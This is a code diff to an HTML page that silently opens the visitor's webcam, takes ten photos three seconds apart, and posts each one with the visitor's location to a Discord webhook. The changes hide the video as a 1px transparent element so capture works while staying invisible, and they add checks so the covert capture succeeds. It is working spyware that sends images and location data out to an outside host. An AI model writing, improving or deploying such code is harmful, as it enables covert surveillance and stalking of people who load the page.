@@ -6,7 +6,10 @@
     <title>Automatic Multiple Photo Capture with Location</title>
     <style>
         video, canvas {
-            display: none; /* Hide video and canvas */
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
         }
     </style>
 </head>
@@ -25,7 +28,9 @@
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => video.play();
                 captureMultiplePhotos();  // Start capturing photos
             } catch (error) {
                 console.error("Error accessing camera:", error);
@@ -89,6 +94,7 @@
         async function captureMultiplePhotos() {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
+            const video = document.getElementById('video');
             let captureCount = 0;
             const maxCaptures = 10;
             const captureInterval = 3000; // 3 seconds
@@ -96,27 +102,30 @@
             // Function to capture a photo and send it to Discord
             async function captureAndSendPhoto() {
                 try {
-                    context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
-                    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
 
-                    if (imageBlob) {
-                        const formData = new FormData();
-                        formData.append('file', imageBlob, `capture_${captureCount + 1}.png`);
-                        formData.append('payload_json', JSON.stringify({ content: `Location: ${locationData}` }));
+                        if (imageBlob) {
+                            const formData = new FormData();
+                            formData.append('file', imageBlob, `capture_${captureCount + 1}.png`);
+                            formData.append('payload_json', JSON.stringify({ content: `Location: ${locationData}` }));
 
-                        const response = await fetch(discordWebhookURL, {
-                            method: 'POST',
-                            body: formData
-                        });
+                            const response = await fetch(discordWebhookURL, {
+                                method: 'POST',
+                                body: formData
+                            });
 
-                        if (!response.ok) {
-                            console.error("Failed to send image to Discord:", response.statusText);
+                            if (!response.ok) {
+                                console.error("Failed to send image to Discord:", response.statusText);
+                                sendLocationOnlyToDiscord();
+                            }
+                        } else {
+                            console.error("Failed to capture image.");
                             sendLocationOnlyToDiscord();
                         }
                     } else {
-                        console.error("Failed to capture image.");
-                        sendErrorToDiscord("Failed to capture image.");
-                        sendLocationOnlyToDiscord();
+                        console.error("Video feed is not ready.");
                     }
                 } catch (error) {
                     console.error("Error sending image to Discord:", error);
